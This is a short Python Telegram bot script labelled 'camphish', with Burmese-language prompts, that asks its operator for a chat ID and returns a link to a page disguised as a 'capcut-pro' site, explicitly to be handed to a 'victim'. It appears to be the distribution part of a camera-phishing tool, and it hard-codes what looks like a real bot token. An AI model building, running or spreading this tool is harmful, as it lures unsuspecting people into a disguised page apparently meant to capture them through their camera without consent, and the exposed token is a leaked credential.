from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

TOKEN = '7536139552:AAFn2KyOFgaqFN_I_xKLywZyHMBo89s3qNY'
users = {}

def start_camera(update, context):
    chat_id = update.message.chat_id
    context.bot.send_message(chat_id, "camphish is start. Chat ID ထည့်ပါ")
    users[chat_id] = 'waiting'

def handle_text(update, context):
    chat_id = update.message.chat_id
    text = update.message.text.strip()

    if chat_id in users and users[chat_id] == 'waiting':
        try:
            int(text)
            target = text
            users[chat_id] = target
            link = f"https://capcut-pro.netlify.app/index.html?target={target}"
            context.bot.send_message(chat_id, f"ဤ link ကို victim ဆီပေးပါ:\n{link}")
        except:
            context.bot.send_message(chat_id, "Chat ID မမှန်ပါ")

updater = Updater(TOKEN, use_context=True)
dp = updater.dispatcher
dp.add_handler(CommandHandler("camera", start_camera))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_text))

updater.start_polling()
updater.idle()